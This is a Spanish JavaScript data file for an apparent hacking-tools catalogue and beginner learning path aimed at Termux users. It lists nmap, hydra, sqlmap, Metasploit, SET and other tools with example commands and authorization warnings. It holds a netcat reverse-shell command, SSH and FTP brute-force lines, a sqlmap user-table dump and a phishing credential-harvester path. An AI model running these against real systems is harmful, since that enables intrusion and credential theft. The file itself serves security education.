const DATA = {
  tools: [
    // === RECONOCIMIENTO ===
    {
      id: 'nmap', name: 'Nmap', category: 'recon', icon: '🌐',
      catLabel: 'Reconocimiento',
      desc: 'Escáner de puertos y descubrimiento de red. Fundamental para mapear redes, identificar servicios activos, SO y versiones.',
      ethicalDesc: 'Úsalo solo en redes propias o con autorización. Escanear sin permiso es ilegal.',
      commands: [
        { label: 'Escaneo básico', cmd: 'nmap -sV <target>' },
        { label: 'Escaneo sigiloso SYN', cmd: 'nmap -sS -T4 <target>' },
        { label: 'Detectar SO y servicios', cmd: 'nmap -O -sV <target>' },
        { label: 'Escaneo red local', cmd: 'nmap -sn 192.168.1.0/24' },
        { label: 'Todos los puertos', cmd: 'nmap -p- <target>' }
      ],
      install: 'pkg install nmap',
      termux: true, platform: 'Linux, Win, macOS, Android (Termux)',
      url: 'https://nmap.org',
      downloadUrl: 'https://nmap.org/download.html',
      downloadLabel: 'nmap.org/download'
    },
    {
      id: 'nikto', name: 'Nikto', category: 'recon', icon: '🔍',
      catLabel: 'Reconocimiento',
      desc: 'Escáner de servidores web. Detecta 6700+ archivos peligrosos, configuraciones incorrectas y versiones desactualizadas.',
      ethicalDesc: 'Requiere autorización explícita del propietario.',
      commands: [
        { label: 'Escaneo básico', cmd: 'nikto -h <target>' },
        { label: 'Con SSL', cmd: 'nikto -h https://<target>' },
        { label: 'Puerto específico', cmd: 'nikto -h <target> -p 8080' },
        { label: 'Guardar reporte', cmd: 'nikto -h <target> -o reporte.html' }
      ],
      install: 'pkg install nikto',
      termux: true, platform: 'Linux, Android (Termux), Win (WSL)',
      url: 'https://github.com/sullo/nikto',
      downloadUrl: 'https://github.com/sullo/nikto/releases',
      downloadLabel: 'GitHub Releases'
    },
    {
      id: 'wpscan', name: 'WPScan', category: 'recon', icon: '🔐',
      catLabel: 'Reconocimiento',
      desc: 'Escáner de seguridad especializado en WordPress. Detecta plugins vulnerables, temas obsoletos y usuarios.',
      ethicalDesc: 'Solo contra sitios propios o con autorización.',
      commands: [
        { label: 'Escaneo básico', cmd: 'wpscan --url <target>' },
        { label: 'Enumerar usuarios', cmd: 'wpscan --url <target> --enumerate u' },
        { label: 'Plugins vulnerables', cmd: 'wpscan --url <target> --enumerate vp' },
        { label: 'Modo agresivo', cmd: 'wpscan --url <target> --plugins-detection aggressive' }
      ],
      install: 'gem install wpscan',
      termux: true, platform: 'Linux, Android (Termux), macOS, Win (WSL)',
      url: 'https://wpscan.com',
      downloadUrl: 'https://wpscan.com/register',
      downloadLabel: 'wpscan.com'
    },
    {
      id: 'sublist3r', name: 'Sublist3r', category: 'recon', icon: '📡',
      catLabel: 'Reconocimiento',
      desc: 'Enumeración de subdominios usando OSINT. Busca en Google, Yahoo, Bing y más fuentes.',
      ethicalDesc: 'Útil en pentesting autorizado para mapear superficie de ataque.',
      commands: [
        { label: 'Enumerar subdominios', cmd: 'sublist3r -d <dominio>' },
        { label: 'Usar todos los motores', cmd: 'sublist3r -d <dominio> -b' },
        { label: 'Guardar resultados', cmd: 'sublist3r -d <dominio> -o subs.txt' }
      ],
      install: 'pip install sublist3r',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://github.com/aboul3la/Sublist3r',
      downloadUrl: 'https://github.com/aboul3la/Sublist3r',
      downloadLabel: 'GitHub'
    },
    {
      id: 'amass', name: 'Amass', category: 'recon', icon: '🗺️',
      catLabel: 'Reconocimiento',
      desc: 'Mapeo de superficie de ataque. Descubre subdominios, IPs y certificados usando scraping y APIs.',
      commands: [
        { label: 'Enumeración básica', cmd: 'amass enum -d <dominio>' },
        { label: 'Enumeración pasiva', cmd: 'amass enum -passive -d <dominio>' },
        { label: 'Mapeo visual', cmd: 'amass viz -d <dominio>' }
      ],
      install: 'pkg install amass',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://github.com/owasp-amass/amass',
      downloadUrl: 'https://github.com/owasp-amass/amass/releases',
      downloadLabel: 'GitHub Releases'
    },

    // === ESCANEO WEB ===
    {
      id: 'zap', name: 'OWASP ZAP', category: 'web', icon: '🛡️',
      catLabel: 'Escaneo Web',
      desc: 'Proxy de intercepción y escáner de vulnerabilidades web. Detecta SQLi, XSS, CSRF y más. Estándar OWASP.',
      ethicalDesc: 'Estándar OWASP para testing. Siempre con autorización. Ideal para CI/CD.',
      commands: [
        { label: 'Escaneo CLI', cmd: 'zap-cli quick-scan --self-contained --start-options "-config api.disablekey=true" <url>' },
        { label: 'Spider automático', cmd: 'zap-cli spider <url>' },
        { label: 'Escaneo activo', cmd: 'zap-cli active-scan <url>' },
        { label: 'Reporte PDF', cmd: 'zap-cli report -o reporte.pdf -f pdf' }
      ],
      install: 'pkg install zap (o descargar desde web)',
      termux: false, platform: 'Win, Linux, macOS (requiere Java)',
      url: 'https://www.zaproxy.org',
      downloadUrl: 'https://www.zaproxy.org/download/',
      downloadLabel: 'zaproxy.org/download'
    },
    {
      id: 'burp', name: 'Burp Suite', category: 'web', icon: '🔬',
      catLabel: 'Escaneo Web',
      desc: 'Proxy de intercepción para pruebas de seguridad web. Community gratuita con Repeater, Intruder demo y Decoder.',
      ethicalDesc: 'Community Edition es excelente para aprender. Usar en laboratorios propios.',
      commands: [
        { label: 'Configurar proxy', cmd: 'Proxy en 127.0.0.1:8080 -> Cert en http://burpsuite' },
        { label: 'Repeater', cmd: 'Click derecho > Send to Repeater' },
        { label: 'Intruder', cmd: 'Posicionar payload > Add § > Start attack' },
        { label: 'Decoder', cmd: 'Pestaña Decoder > Input > Encode/Decode' }
      ],
      install: 'Descargar desde portswigger.net',
      termux: false, platform: 'Win, Linux, macOS (requiere Java)',
      url: 'https://portswigger.net/burp',
      downloadUrl: 'https://portswigger.net/burp/communitydownload',
      downloadLabel: 'PortSwigger (Community)'
    },
    {
      id: 'gobuster', name: 'Gobuster', category: 'web', icon: '📂',
      catLabel: 'Escaneo Web',
      desc: 'Fuerza bruta de directorios web, subdominios DNS y buckets S3. Extremadamente rápido.',
      ethicalDesc: 'Útil en pentesting autorizado para descubrir rutas ocultas.',
      commands: [
        { label: 'Descubrir directorios', cmd: 'gobuster dir -u <url> -w wordlist.txt' },
        { label: 'Subdominios DNS', cmd: 'gobuster dns -d <dominio> -w subs.txt' },
        { label: 'Con extensiones', cmd: 'gobuster dir -u <url> -w words.txt -x php,txt,html' }
      ],
      install: 'pkg install gobuster',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://github.com/OJ/gobuster',
      downloadUrl: 'https://github.com/OJ/gobuster/releases/latest',
      downloadLabel: 'GitHub Releases'
    },
    {
      id: 'dirb', name: 'Dirb', category: 'web', icon: '📁',
      catLabel: 'Escaneo Web',
      desc: 'Escáner de contenido web basado en diccionario. Encuentra directorios y archivos ocultos.',
      commands: [
        { label: 'Escaneo básico', cmd: 'dirb <url>' },
        { label: 'Con extensión', cmd: 'dirb <url> -X .php' },
        { label: 'Wordlist personalizada', cmd: 'dirb <url> /ruta/wordlist.txt' }
      ],
      install: 'pkg install dirb',
      termux: true, platform: 'Linux, Android (Termux)',
      url: 'https://dirb.sourceforge.net',
      downloadUrl: 'https://dirb.sourceforge.net',
      downloadLabel: 'SourceForge'
    },

    // === REDES ===
    {
      id: 'wireshark', name: 'Wireshark', category: 'network', icon: '📊',
      catLabel: 'Redes',
      desc: 'Analizador de protocolos de red. Captura y examina tráfico en tiempo real.',
      ethicalDesc: 'Monitorear redes sin permiso es ilegal. Solo en tu propia red.',
      commands: [
        { label: 'Capturar en interfaz', cmd: 'tshark -i eth0' },
        { label: 'Filtrar HTTP', cmd: 'tshark -Y "http.request"' },
        { label: 'Filtrar por IP', cmd: 'tshark -Y "ip.addr == 192.168.1.1"' },
        { label: 'Guardar captura', cmd: 'tshark -i eth0 -w captura.pcapng' }
      ],
      install: 'pkg install wireshark (tshark CLI)',
      termux: true, platform: 'Linux, Android (Termux CLI), Win, macOS',
      url: 'https://www.wireshark.org',
      downloadUrl: 'https://www.wireshark.org/download.html',
      downloadLabel: 'wireshark.org/download'
    },
    {
      id: 'tcpdump', name: 'TCPDump', category: 'network', icon: '📡',
      catLabel: 'Redes',
      desc: 'Sniffer de paquetes por CLI. Ligero y potente, ideal para servidores sin GUI.',
      commands: [
        { label: 'Capturar todo', cmd: 'tcpdump -i eth0' },
        { label: 'Puerto específico', cmd: 'tcpdump -i eth0 port 80' },
        { label: 'Guardar captura', cmd: 'tcpdump -i eth0 -w captura.pcap' },
        { label: 'Leer .pcap', cmd: 'tcpdump -r captura.pcap' }
      ],
      install: 'pkg install tcpdump',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://www.tcpdump.org',
      downloadUrl: 'https://www.tcpdump.org',
      downloadLabel: 'tcpdump.org'
    },
    {
      id: 'netcat', name: 'Netcat', category: 'network', icon: '🔌',
      catLabel: 'Redes',
      desc: 'Navaja suiza de conexiones TCP/UDP. Ideal para debugging, banners y reverse shells.',
      ethicalDesc: 'Reverse shells solo en entornos controlados.',
      commands: [
        { label: 'Escaneo de puertos', cmd: 'nc -zv <target> 20-80' },
        { label: 'Banner de servicio', cmd: 'nc -v <target> 80' },
        { label: 'Reverse shell', cmd: 'nc -e /bin/sh <tu-ip> 4444' },
        { label: 'Escuchar conexión', cmd: 'nc -lvnp 4444' }
      ],
      install: 'pkg install netcat-openbsd',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://nc110.sourceforge.io',
      downloadUrl: 'https://nc110.sourceforge.io',
      downloadLabel: 'SourceForge'
    },

    // === VULNERABILIDADES ===
    {
      id: 'openvas', name: 'OpenVAS / Greenbone', category: 'vuln', icon: '💉',
      catLabel: 'Vulnerabilidades',
      desc: 'Escáner completo de vulnerabilidades con 100,000+ CVEs. Incluye reportes detallados.',
      ethicalDesc: 'Sistema enterprise de gestión de vulnerabilidades. Siempre con autorización.',
      commands: [
        { label: 'Iniciar servicio', cmd: 'gvm-start' },
        { label: 'Parar servicio', cmd: 'gvm-stop' },
        { label: 'Escaneo por consola', cmd: 'gvm-cli socket --xml "<create_task/>"' }
      ],
      install: 'pkg install openvas (o VM en Win)',
      termux: true, platform: 'Linux, Android (Termux), Win (VM)',
      url: 'https://www.greenbone.net',
      downloadUrl: 'https://www.greenbone.net/en/greenbone-free/',
      downloadLabel: 'Greenbone FREE (OVA)'
    },
    {
      id: 'nuclei', name: 'Nuclei', category: 'vuln', icon: '🧬',
      catLabel: 'Vulnerabilidades',
      desc: 'Escáner rápido basado en templates YAML. Comunidad activa con miles de plantillas.',
      ethicalDesc: 'Verificar permiso antes de escanear.',
      commands: [
        { label: 'Escaneo básico', cmd: 'nuclei -u <url>' },
        { label: 'Todos los templates', cmd: 'nuclei -u <url> -t nuclei-templates/' },
        { label: 'Tecnologías', cmd: 'nuclei -u <url> -tags tech' },
        { label: 'Reporte JSON', cmd: 'nuclei -u <url> -json -o resultados.json' }
      ],
      install: 'pkg install nuclei',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://nuclei.projectdiscovery.io',
      downloadUrl: 'https://github.com/projectdiscovery/nuclei/releases/latest',
      downloadLabel: 'GitHub Releases'
    },

    // === PASSWORDS & CRYPTO ===
    {
      id: 'hashcat', name: 'Hashcat', category: 'password', icon: '⚡',
      catLabel: 'Passwords & Crypto',
      desc: 'Recuperador de contraseñas basado en GPU. Soporta cientos de algoritmos.',
      ethicalDesc: 'Solo para recuperar tus propias contraseñas o auditorías autorizadas.',
      commands: [
        { label: 'Diccionario MD5', cmd: 'hashcat -m 0 -a 0 hashes.txt wordlist.txt' },
        { label: 'Con reglas', cmd: 'hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r rules/best64.rule' },
        { label: 'Fuerza bruta', cmd: 'hashcat -m 1400 -a 3 hashes.txt ?a?a?a?a?a?a' }
      ],
      install: 'pkg install hashcat',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://hashcat.net',
      downloadUrl: 'https://hashcat.net/hashcat/',
      downloadLabel: 'hashcat.net'
    },
    {
      id: 'john', name: 'John the Ripper', category: 'password', icon: '🔓',
      catLabel: 'Passwords & Crypto',
      desc: 'Auditor de contraseñas multi-plataforma. Detecta tipos de hash automáticamente.',
      commands: [
        { label: 'Crackear hashes', cmd: 'john --wordlist=wordlist.txt hashes.txt' },
        { label: 'Mostrar resultados', cmd: 'john --show hashes.txt' },
        { label: 'Con reglas', cmd: 'john --wordlist=wordlist.txt --rules hashes.txt' }
      ],
      install: 'pkg install john',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://www.openwall.com/john',
      downloadUrl: 'https://www.openwall.com/john/',
      downloadLabel: 'openwall.com/john'
    },
    {
      id: 'hydra', name: 'Hydra', category: 'password', icon: '🐍',
      catLabel: 'Passwords & Crypto',
      desc: 'Fuerza bruta para servicios de red. Soporta SSH, FTP, HTTP, MySQL, RDP, SMB y 50+ protocolos.',
      ethicalDesc: 'Solo contra servicios propios o con autorización. Forzar acceso es delito.',
      commands: [
        { label: 'Fuerza bruta SSH', cmd: 'hydra -l admin -P passwords.txt ssh://<target>' },
        { label: 'Fuerza bruta FTP', cmd: 'hydra -L users.txt -P passwords.txt ftp://<target>' },
        { label: 'HTTP POST form', cmd: 'hydra -l admin -P passwords.txt <target> http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"' }
      ],
      install: 'pkg install hydra',
      termux: true, platform: 'Linux, Android (Termux), Win (Cygwin)',
      url: 'https://github.com/vanhauser-thc/thc-hydra',
      downloadUrl: 'https://github.com/vanhauser-thc/thc-hydra/releases',
      downloadLabel: 'GitHub Releases'
    },

    // === OSINT ===
    {
      id: 'theharvester', name: 'theHarvester', category: 'osint', icon: '🌍',
      catLabel: 'OSINT',
      desc: 'Recolector de correos, subdominios, IPs y URLs usando motores de búsqueda y APIs.',
      ethicalDesc: 'Información pública. Cumplir términos de servicio.',
      commands: [
        { label: 'Buscar correos', cmd: 'theHarvester -d <dominio> -b google' },
        { label: 'Múltiples fuentes', cmd: 'theHarvester -d <dominio> -b google,linkedin,bing' },
        { label: 'Incluir IPs', cmd: 'theHarvester -d <dominio> -b all' }
      ],
      install: 'pip install theHarvester',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://github.com/laramies/theHarvester',
      downloadUrl: 'https://github.com/laramies/theHarvester',
      downloadLabel: 'GitHub'
    },
    {
      id: 'sherlock', name: 'Sherlock', category: 'osint', icon: '🕵️',
      catLabel: 'OSINT',
      desc: 'Encuentra nombres de usuario en 400+ redes sociales. Ideal para OSINT.',
      ethicalDesc: 'Información pública. Útil para verificar huella digital propia.',
      commands: [
        { label: 'Buscar usuario', cmd: 'sherlock <username>' },
        { label: 'Guardar resultados', cmd: 'sherlock <username> --output resultados/' },
        { label: 'Redes específicas', cmd: 'sherlock <username> --site instagram --site twitter' }
      ],
      install: 'pip install sherlock-project',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://github.com/sherlock-project/sherlock',
      downloadUrl: 'https://github.com/sherlock-project/sherlock',
      downloadLabel: 'GitHub'
    },
    {
      id: 'shodan', name: 'Shodan', category: 'osint', icon: '🔎',
      catLabel: 'OSINT',
      desc: 'Buscador de dispositivos conectados a Internet. Encuentra servidores, cámaras, routers, PLCs.',
      ethicalDesc: 'Información pública indexada. No acceder sin autorización.',
      commands: [
        { label: 'Buscar servicio', cmd: 'shodan search "apache" --limit 10' },
        { label: 'Buscar puerto', cmd: 'shodan search "port:22" --limit 10' },
        { label: 'Info de IP', cmd: 'shodan host <ip>' },
        { label: 'Vulnerabilidades', cmd: 'shodan search "vuln:cve-2021-41773"' }
      ],
      install: 'pip install shodan (requiere API key)',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://www.shodan.io',
      downloadUrl: 'https://cli.shodan.io/',
      downloadLabel: 'Install Guide'
    },

    // === EXPLOTACIÓN ===
    {
      id: 'metasploit', name: 'Metasploit', category: 'exploit', icon: '💥',
      catLabel: 'Explotación',
      desc: 'Framework de explotación más completo. Miles de exploits, payloads y post-explotación.',
      ethicalDesc: 'Extremadamente poderoso. Solo en entornos autorizados.',
      commands: [
        { label: 'Iniciar consola', cmd: 'msfconsole' },
        { label: 'Buscar exploit', cmd: 'search eternalblue' },
        { label: 'Usar exploit', cmd: 'use exploit/windows/smb/ms17_010_eternalblue' },
        { label: 'Mostrar opciones', cmd: 'show options' }
      ],
      install: 'pkg install metasploit',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://www.metasploit.com',
      downloadUrl: 'https://windows.metasploit.com/metasploitframework-latest.msi',
      downloadLabel: 'Windows MSI / Termux'
    },
    {
      id: 'searchsploit', name: 'Searchsploit', category: 'exploit', icon: '📖',
      catLabel: 'Explotación',
      desc: 'Buscador offline de exploits de Exploit-DB. 50,000+ exploits sin conexión.',
      commands: [
        { label: 'Buscar exploit', cmd: 'searchsploit wordpress 5.0' },
        { label: 'Buscar por CVE', cmd: 'searchsploit cve-2021-41773' },
        { label: 'Copiar exploit', cmd: 'searchsploit -m exploits/php/webapps/12345.php' }
      ],
      install: 'pkg install exploitdb (o git clone en Termux)',
      termux: true, platform: 'Linux, Android (Termux), Win (WSL)',
      url: 'https://www.exploit-db.com',
      downloadUrl: 'https://gitlab.com/exploit-database/exploitdb',
      downloadLabel: 'GitLab'
    },
    {
      id: 'sqlmap', name: 'SQLMap', category: 'exploit', icon: '🗄️',
      catLabel: 'Explotación',
      desc: 'Detección y explotación automatizada de SQL Injection. Soporta la mayoría de bases de datos.',
      ethicalDesc: 'Puede dañar BD si se usa incorrectamente. Solo testing autorizado.',
      commands: [
        { label: 'Detectar SQLi', cmd: 'sqlmap -u "http://target.com/page?id=1"' },
        { label: 'Extraer DBs', cmd: 'sqlmap -u "http://target.com/page?id=1" --dbs' },
        { label: 'Tablas de DB', cmd: 'sqlmap -u "http://target.com/page?id=1" -D db --tables' },
        { label: 'Dump de tabla', cmd: 'sqlmap -u "http://target.com/page?id=1" -D db -T users --dump' }
      ],
      install: 'pip install sqlmap',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://sqlmap.org',
      downloadUrl: 'https://sqlmap.org/#download',
      downloadLabel: 'sqlmap.org'
    },
    {
      id: 'beef', name: 'BeEF', category: 'exploit', icon: '🎣',
      catLabel: 'Explotación',
      desc: 'Browser Exploitation Framework. Una vez que el objetivo "muerde el anzuelo", ejecutas módulos.',
      ethicalDesc: 'Requiere que el objetivo visite tu página hook.',
      commands: [
        { label: 'Iniciar BeEF', cmd: 'beef-xss' },
        { label: 'Panel de control', cmd: 'http://localhost:3000/ui/panel' }
      ],
      install: 'pkg install beef-xss',
      termux: true, platform: 'Linux, Android (Termux)',
      url: 'https://beefproject.com',
      downloadUrl: 'https://github.com/beefproject/beef',
      downloadLabel: 'GitHub'
    },

    // === PRIVACIDAD ===
    {
      id: 'tor', name: 'Tor Browser', category: 'privacy', icon: '🧅',
      catLabel: 'Privacidad & Anonimato',
      desc: 'Navegador que enruta tráfico por la red Tor. Oculta IP y evita vigilancia.',
      ethicalDesc: 'Herramienta de privacidad legítima. No es ilegal usarlo.',
      commands: [
        { label: 'Iniciar Tor', cmd: 'tor' },
        { label: 'Verificar conexión', cmd: 'curl --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip' },
        { label: 'Navegador Tor', cmd: 'Descargar de torproject.org (también en F-Droid)' }
      ],
      install: 'pkg install tor',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://www.torproject.org',
      downloadUrl: 'https://www.torproject.org/download/',
      downloadLabel: 'torproject.org/download'
    },
    {
      id: 'proxychains', name: 'Proxychains', category: 'privacy', icon: '🔗',
      catLabel: 'Privacidad & Anonimato',
      desc: 'Obliga a cualquier app a usar proxies. Ideal para encadenar múltiples proxies (Tor, SOCKS, HTTP).',
      ethicalDesc: 'No oculta actividades ilegales.',
      commands: [
        { label: 'Ejecutar por proxy', cmd: 'proxychains nmap -sT <target>' },
        { label: 'Con Tor', cmd: 'proxychains firefox' },
        { label: 'Configurar', cmd: 'echo "socks4 127.0.0.1 9050" >> proxychains.conf' }
      ],
      install: 'pkg install proxychains-ng',
      termux: true, platform: 'Linux, Android (Termux), Win (alternativas)',
      url: 'https://github.com/rofl0r/proxychains-ng',
      downloadUrl: 'https://github.com/rofl0r/proxychains-ng',
      downloadLabel: 'GitHub'
    },

    // === MOVIL ===
    {
      id: 'masvs', name: 'OWASP MASVS', category: 'mobile', icon: '📱',
      catLabel: 'Seguridad Móvil',
      desc: 'Mobile Application Security Verification Standard. Estándar OWASP para apps móviles.',
      ethicalDesc: 'Estándar de seguridad. Úsalo para auditar tus propias apps.',
      commands: [
        { label: 'MASVS v2.0', cmd: 'github.com/OWASP/owasp-masvs' },
        { label: 'Checklist', cmd: 'Revisar MASVS en GitHub' },
        { label: 'MSTG Guía', cmd: 'github.com/OWASP/owasp-mstg' }
      ],
      install: 'PDF/Web - no requiere instalación',
      termux: false, platform: 'Documentación (Web/PDF)',
      url: 'https://mas.owasp.org',
      downloadUrl: 'https://github.com/OWASP/owasp-masvs',
      downloadLabel: 'GitHub OWASP MASVS'
    },
    {
      id: 'mobsf', name: 'MobSF', category: 'mobile', icon: '📲',
      catLabel: 'Seguridad Móvil',
      desc: 'Mobile Security Framework. Análisis automatizado de apps Android/iOS/Windows.',
      ethicalDesc: 'Audita tus propias apps.',
      commands: [
        { label: 'Iniciar MobSF', cmd: 'python manage.py runserver 0.0.0.0:8000' },
        { label: 'Analizar APK', cmd: 'Subir APK desde interfaz web :8000' },
        { label: 'API upload', cmd: 'curl -F "file=@app.apk" http://localhost:8000/api/v1/upload' }
      ],
      install: 'git clone + setup.py (ver web)',
      termux: false, platform: 'Linux, Win, macOS (Python)',
      url: 'https://github.com/MobSF/Mobile-Security-Framework-MobSF',
      downloadUrl: 'https://github.com/MobSF/Mobile-Security-Framework-MobSF',
      downloadLabel: 'GitHub'
    },
    {
      id: 'apktool', name: 'APKTool', category: 'mobile', icon: '🔧',
      catLabel: 'Seguridad Móvil',
      desc: 'Reverse engineering para APKs. Decompila recursos y código Smali.',
      ethicalDesc: 'Auditar tus propias apps o con permiso explícito.',
      commands: [
        { label: 'Decompilar APK', cmd: 'apktool d app.apk' },
        { label: 'Recompilar APK', cmd: 'apktool b app-directorio' },
        { label: 'Firmar APK', cmd: 'jarsigner -keystore my.keystore app-dist.apk alias' }
      ],
      install: 'pkg install apktool',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://apktool.org',
      downloadUrl: 'https://apktool.org/docs/install/',
      downloadLabel: 'apktool.org'
    },
    {
      id: 'jadx', name: 'JADX', category: 'mobile', icon: '📄',
      catLabel: 'Seguridad Móvil',
      desc: 'Descompilador de DEX a Java. Convierte APKs en código Java legible.',
      commands: [
        { label: 'Descompilar APK', cmd: 'jadx -d output/ app.apk' },
        { label: 'Con recursos', cmd: 'jadx --show-bad-code -d output/ app.apk' }
      ],
      install: 'pkg install jadx',
      termux: true, platform: 'Linux, Android (Termux), Win, macOS',
      url: 'https://github.com/skylot/jadx',
      downloadUrl: 'https://github.com/skylot/jadx/releases/tag/v1.5.4',
      downloadLabel: 'GitHub Releases (Win .exe)'
    },

    // === FORENSE ===
    {
      id: 'autopsy', name: 'Autopsy', category: 'forensic', icon: '🔬',
      catLabel: 'Forense Digital',
      desc: 'Plataforma de análisis forense digital con GUI. Recupera archivos, extrae metadatos.',
      ethicalDesc: 'Solo en sistemas propios o investigaciones autorizadas.',
      commands: [
        { label: 'Crear caso', cmd: 'Autopsy GUI -> New Case' },
        { label: 'Analizar imagen', cmd: 'autopsy --img /ruta/imagen.dd' }
      ],
      install: 'Descargar desde web (no disponible en Termux)',
      termux: false, platform: 'Win, Linux, macOS',
      url: 'https://www.sleuthkit.org/autopsy',
      downloadUrl: 'https://www.sleuthkit.org/autopsy/download.php',
      downloadLabel: 'sleuthkit.org'
    },
    {
      id: 'foremost', name: 'Foremost', category: 'forensic', icon: '♻️',
      catLabel: 'Forense Digital',
      desc: 'Recupera archivos borrados por cabeceras (file carving). 20+ formatos.',
      commands: [
        { label: 'Recuperar archivos', cmd: 'foremost -i imagen.dd -o output/' },
        { label: 'Tipos específicos', cmd: 'foremost -t jpeg,png,pdf -i imagen.dd -o output/' }
      ],
      install: 'pkg install foremost',
      termux: true, platform: 'Linux, Android (Termux)',
      url: 'https://foremost.sourceforge.io',
      downloadUrl: 'https://foremost.sourceforge.io',
      downloadLabel: 'SourceForge'
    },

    // === ING. SOCIAL ===
    {
      id: 'set', name: 'SET - Social Engineering Toolkit', category: 'social', icon: '🎭',
      catLabel: 'Ingeniería Social',
      desc: 'Framework de ingeniería social. Phishing, clonación de sitios, payloads.',
      ethicalDesc: 'El phishing sin permiso es ilegal. Solo pruebas autorizadas.',
      commands: [
        { label: 'Iniciar SET', cmd: 'setoolkit' },
        { label: 'Phishing', cmd: '1) Social Engineering > 2) Website Attack > 3) Credential Harvester' }
      ],
      install: 'pkg install setoolkit',
      termux: true, platform: 'Linux, Android (Termux)',
      url: 'https://github.com/trustedsec/social-engineer-toolkit',
      downloadUrl: 'https://github.com/trustedsec/social-engineer-toolkit',
      downloadLabel: 'GitHub'
    }
  ],

  learning: [
    {
      level: 0, title: 'Setup Inicial — Tus primeros pasos', subtitle: 'Preparar el terreno',
      icon: '🚀', time: '15 min',
      install: ['pkg update && pkg upgrade -y', 'pkg install curl wget git python nmap'],
      practice: [
        { label: 'Probar que Termux funciona', cmd: 'echo "Hola desde Termux!" && whoami' },
        { label: 'Ver tu IP pública', cmd: 'curl -s ifconfig.me' },
        { label: 'Hacer ping a un sitio', cmd: 'ping -c 4 google.com' },
        { label: 'Traceroute básico', cmd: 'traceroute google.com' },
        { label: 'Escanea tu red local', cmd: 'nmap -sn 192.168.1.0/24' }
      ],
      learn: [
        'Qué es Termux y cómo funciona',
        'Comandos básicos de Linux: ls, cd, pwd, cat, nano',
        'Qué es una IP, un puerto, un protocolo',
        'Diferencia entre HTTP y HTTPS',
        'Qué es DNS y cómo resuelve nombres',
        'Ética: nunca escanear sin permiso'
      ]
    },
    {
      level: 1, title: 'Escaneo de Redes con Nmap', subtitle: 'Descubrir qué hay en la red',
      icon: '🌐', time: '30 min',
      install: ['pkg install nmap'],
      practice: [
        { label: 'Escaneo básico de puertos', cmd: 'nmap -sV scanme.nmap.org' },
        { label: 'Escaneo de red local', cmd: 'nmap -sn 192.168.1.0/24' },
        { label: 'Detectar sistema operativo', cmd: 'nmap -O 192.168.1.1' },
        { label: 'Escaneo de todos los puertos', cmd: 'nmap -p- 192.168.1.1' },
        { label: 'Escaneo sigiloso', cmd: 'nmap -sS -T4 scanme.nmap.org' },
        { label: 'Guardar resultados', cmd: 'nmap -oN resultados.txt scanme.nmap.org' }
      ],
      learn: [
        'Diferencia entre TCP y UDP',
        'Puertos comunes: 22(SSH), 80(HTTP), 443(HTTPS), 21(FTP)',
        'Estados de puertos: open, closed, filtered',
        'Qué es un banner y para qué sirve',
        'Escaneo sigiloso vs escaneo completo'
      ]
    },
    {
      level: 2, title: 'Enumeración Web — Directorios y Servidores', subtitle: 'Descubrir rutas y tecnologías ocultas',
      icon: '🔍', time: '45 min',
      install: ['pkg install gobuster', 'pkg install nikto'],
      practice: [
        { label: 'Descubrir directorios con Gobuster', cmd: 'gobuster dir -u https://ejemplo.com -w /usr/share/wordlists/dirb/common.txt' },
        { label: 'Descubrir subdominios', cmd: 'gobuster dns -d ejemplo.com -w /usr/share/wordlists/dirb/common.txt' },
        { label: 'Escaneo rápido con Nikto', cmd: 'nikto -h https://ejemplo.com' },
        { label: 'What web technologies?', cmd: 'curl -s -I https://ejemplo.com | grep -i server' },
        { label: 'Revisar robots.txt', cmd: 'curl https://ejemplo.com/robots.txt' }
      ],
      learn: [
        'Qué son los directorios ocultos y por qué existen',
        'Qué revela un servidor web en sus cabeceras HTTP',
        'Cómo funciona robots.txt y sitemap.xml',
        'Identificar tecnologías por cabeceras y cookies',
        'Qué es el fingerprinting de servidores'
      ]
    },
    {
      level: 3, title: 'OSINT — Investigación sin dejar rastro', subtitle: 'Recolectar información pública',
      icon: '🕵️', time: '40 min',
      install: ['pip install sherlock-project', 'pip install theHarvester', 'pip install shodan'],
      practice: [
        { label: 'Buscar usuario en redes', cmd: 'sherlock tu_usuario_de_prueba' },
        { label: 'Recolectar correos', cmd: 'theHarvester -d ejemplo.com -b google' },
        { label: 'Buscar subdominios', cmd: 'theHarvester -d ejemplo.com -b bing' },
        { label: 'Google Dorks básico', cmd: 'Busca en Google: site:ejemplo.com filetype:pdf' },
        { label: 'Ver certificados SSL', cmd: 'curl -s https://crt.sh/?q=ejemplo.com | grep -o "\'[a-z0-9.-]*\.ejemplo.com\'"' }
      ],
      learn: [
        'Qué es OSINT y cómo se usa legalmente',
        'Google Dorks: operadores site:, filetype:, intitle:',
        'Shodan: el buscador de dispositivos',
        'crt.sh: registros de certificados SSL',
        'Cómo la información pública puede ser recolectada'
      ]
    },
    {
      level: 4, title: 'Escaneo de Vulnerabilidades', subtitle: 'Detectar fallos de seguridad',
      icon: '🛡️', time: '1 hora',
      install: ['pkg install nuclei', 'pkg install wpscan'],
      practice: [
        { label: 'Escaneo rápido con Nuclei', cmd: 'nuclei -u https://ejemplo.com' },
        { label: 'Nuclei con templates de tecnología', cmd: 'nuclei -u https://ejemplo.com -tags tech' },
        { label: 'WPScan en WordPress', cmd: 'wpscan --url https://ejemplo-wp.com' },
        { label: 'WPScan enumerar usuarios', cmd: 'wpscan --url https://ejemplo-wp.com --enumerate u' },
